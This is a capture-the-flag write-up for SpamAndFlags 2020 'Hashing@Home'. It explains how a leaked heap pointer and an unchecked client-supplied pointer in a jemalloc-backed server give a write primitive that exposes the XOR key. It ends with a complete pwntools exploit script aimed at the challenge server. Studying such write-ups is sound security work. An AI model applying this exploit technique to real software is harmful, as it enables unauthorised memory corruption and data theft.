# SpamAndFlags 2020 - Hashing@Home

## Challenge

So we have come up with a distributed hashing solution , like other popular @home projects, but it's for profit and is used to enhance our clients security. Please donate your CPU time for this noble goal.

The client is distributed in source form, so you can compile it for your favorite UNIX clone. We also share the server source so you can audit it yourself.
Oh yeah, BTW, jemalloc is faster than "classic" malloc, so that's what we use on the server.

If you're a client of ours, and worried that your hashes will be sent to normal people, don't worry. We use a very secure salting method with a secure secret key, so noone will ever know what you need hashed.

Server: `nc 35.230.128.35 1337`

241 points

## Solution

### Overview

The challenge included a `server.c` and a `client.c` file. The server incorporated some `xor`-based hashing mechanism. We did not need the client file. The challenge stated they used `jemalloc`.

#### Building the source

In order to get to know `jemalloc` we built the application. As there are only 2 `calloc()` calls and nothing else heap-related we don't need thorough understanding of `jemalloc`'s algorithms.

```
cc server.c -o hah -L`jemalloc-config --libdir` -Wl,-rpath,`jemalloc-config --libdir` -ljemalloc `jemalloc-config --libs`
```

#### The application

The application works the following way:
1. `calloc()` 64 bytes and read flag from arguments
2. read the input in 32 byte chunks and store `input XOR key[:32]` with some metadata in a linked list on the heap
3. send back each chunk's address and the encrypted data to the user
4. read user data to user-specified location (if magic is correct)
5. shrink linked list if some metadata check applies

#### The goal

The challenge hinted we need to obtain some secret they deemed impossible to recover. This may be the key used for `xor` or the data of the input file. As obtaining the key enables decryption of the file's content we started with that.

### Solution

#### Leak

The application leaks the addresses of the elements of the linked list.

```c
void send_request(const hash_rpc_context* request_context){
    /* XXX: the request's pointer is used as the request ID
     * maybe this should be an UUID? */
    write(1, &request_context, sizeof(request_context));
    write(1, request_context->data_to_hash, CHUNK_SIZE);
}
```

#### Read key

In `receive_response()` the application checks if the address we sent points to the magical 8 bytes set in a global variable.

```c
void receive_response(){
    hash_rpc_context* request_context;
    char response_data[CHUNK_SIZE];
    if (read(0, &request_context, sizeof(request_context)) != sizeof(request_context)){
        exit(2);
    }
    if (read(0, response_data, CHUNK_SIZE) != CHUNK_SIZE) {
        exit(3);
    }
    if (request_context->magic != CONTEXT_MAGIC) {              <---- HERE
        exit(4);
    }
    process_response(request_context, response_data);
}
```

In `processResponse()` we can write anything in the `data_to_hash` section of the struct:

```c
void process_response(hash_rpc_context* request_context, char response_data[CHUNK_SIZE]){
    --request_context->rounds_left;
    if(request_context->rounds_left){
        memcpy(request_context->data_to_hash, response_data, CHUNK_SIZE);     <---- HERE
        send_request(request_context);
    } else {
        if (
            first_context->next &&
            first_context->rounds_left == 0 &&
            first_context->next->rounds_left == 0
        ){
            hash_together_the_first_two();
        }
    }
}
```

A no additional checks are performed on the received pointer, this gives us a write primitive the following way.

Lets examine the memory layout of the application:

```
00007F8856616000  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa -+
00007F8856616010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa  |__ key
00007F8856616020  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa  |
00007F8856616030  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 00  aaaaaaaaaaaaaaa. -+
00007F8856616040  6D 6F 68 22 68 73 61 68  64 00 00 00 00 00 00 00  moh"hsahd....... -+
00007F8856616050  00 00 00 00 00 00 00 00  03 03 03 03 03 03 03 03  ................  |__ hash_rpc_context_s
00007F8856616060  03 03 03 03 03 03 03 03  03 03 03 03 03 03 03 03  ................  |   of input[:32]
00007F8856616070  03 03 03 03 03 03 03 03  00 00 00 00 00 00 00 00  ................ -+
00007F8856616080  6D 6F 68 22 68 73 61 68  64 00 00 00 00 00 00 00  moh"hsahd....... -+
00007F8856616090  40 60 61 56 88 7F 00 00  03 03 03 03 03 03 03 03  @`aV............  |__ hash_rpc_context_s
00007F88566160A0  03 03 03 03 03 03 03 03  03 03 03 03 03 03 03 03  ................  |   of input[32:64]
00007F88566160B0  03 03 03 03 03 03 03 03  00 00 00 00 00 00 00 00  ................ -+
00007F88566160C0  6D 6F 68 22 68 73 61 68  64 00 00 00 00 00 00 00  moh"hsahd.......
00007F88566160D0  80 60 61 56 88 7F 00 00  03 03 03 03 03 03 03 03  .`aV............
00007F88566160E0  03 03 03 03 03 03 03 03  03 03 03 03 03 03 03 03  ................  ...
00007F88566160F0  03 03 03 03 03 03 03 03  00 00 00 00 00 00 00 00  ................
```

As we can see the 64 byte key and the `hash_rpc_context_s` structs are placed in the same run as their sizes are almost equivalent. Almost meaning that based on the source code the size of the struct is 52 bytes but the `*next` field gets aligned to 8 bytes after the 4 byte `rounds` thus the actual size is 56. This is rounded up to 64 bytes by the malloc algorithm. In fact this gives us the address of the key (first-64). So the memory map of two `hash_rpc_context_s` is the following:

```
   +-------------------------+-------------------------+
+->|          magic          |          rounds         |
|  |          *next          |           data          |
|  |           ...           |           ...           |
|  |           data          | 00 00 00 00 00 00 00 00 |
|  |          magic          |          rounds         |
+--|          *next          |           data          |
   |           ...           |           ...           |
   |           data          | 00 00 00 00 00 00 00 00 |
   +---------------------------------------------------+
```

Lets overwrite the data section of the topmost struct with `b'\x00'*16 + magic + p64(1, sign='unsigned')` the following way:

```
   +-------------------------+-------------------------+
+->|          magic          |          rounds         |
|  |          *next          | 00 00 00 00 00 00 00 00 |
|  | 00 00 00 00 00 00 00 00 |          magic          |
|  |          p64(1)         | 00 00 00 00 00 00 00 00 |
|  |          magic          |          rounds         |
+--|          *next          |           data          |
   |           ...           |           ...           |
   |           data          | 00 00 00 00 00 00 00 00 |
   +---------------------------------------------------+
```

This way we produce a misaligned `hash_rpc_context_s` at `first + 0x28`:

```
   +-------------------------+-------------------------+
+->|                         |                         |
|  |                         |_________________________|
|  |_________________________|          magic          |
|  |          rounds         |       *next = null      |
|  |          data           |           ...           |
+--|___________...___________|___________data__________|
   |                         |                         |
   |                         |                         |
   +---------------------------------------------------+
```

At the next write we give `first + 0x28` as the address. The magic check succeeds and we get wo write into the misaligned struct. Thus we can overwrite the metadata of the second struct.
Now if the aforementioned two structs are `first_context` and `first_context->next` (the lastly allocated, highest address, first read by the client) and we overwrite `first_context->rounds = 1` and `first_context->next = keyPtr` the application will return `key XOR first_context->data_to_hash`. If we set `first_context->data_to_hash = 64*'\x00'` we get the key.

#### Exploit

```python
#!/usr/bin/env python3
# coding: utf-8
from pwn import *
import binascii

p = None

def main(args):
#    globals()["p"] = process(["./hah", 'a'*64, 'data', 'hash'])
#    print("PID: %s" % (str(p.proc.pid)))

    globals()["p"] = remote("35.230.128.35", "1337")

    magic = p64(0x6861736822686f6d, sign='unsigned')

    resp = p.recvn(640)
    chunks = []
    print(f'Response len: {len(resp)}')
    for i in range(0,len(resp), 40):
        ptr = u64(resp[i:i+8])
        data = resp[i+8:i+40]
        print(str(i) + ':\t' + hex(ptr) + ' - ' + binascii.hexlify(data).decode())
        chunks.append((ptr, data))

    keyPtr = chunks[-1][0] - 0x40
    print(f'KEY @ {hex(keyPtr)}')

    pause()

    p.send(p64(chunks[0][0]) + b'\x00'*32)
    resp = p.recvn(40)
    print(hex(u64(resp[:8])) + ': ' + binascii.hexlify(resp[8:]).decode())



    p.send(p64(chunks[1][0]) + b'\x00'*16 + magic + p64(100, sign='unsigned'))
    resp = p.recvn(40)
    print(hex(u64(resp[:8])) + ': ' + binascii.hexlify(resp[8:]).decode())

    p.send(p64(chunks[1][0] + 40) + magic + p64(1, sign='unsigned') + p64(keyPtr - 24) + b'\x00'*8)
    resp = p.recvn(40)
    print(hex(u64(resp[:8])) + ': ' + binascii.hexlify(resp[8:]).decode())



    p.send(p64(chunks[0][0]) + b'\x00'*32)
    resp = p.recvn(40)
    print(hex(u64(resp[:8])) + ': ' + binascii.hexlify(resp[8:]).decode())
    print(resp[8:])


if __name__ == "__main__":
     main(sys.argv)
```

Thus we get the flag: `SaF{magic-based_security}`

## Files

* [Solution](solution.py)

## Other write-ups

- <https://ctftime.org/task/11526>
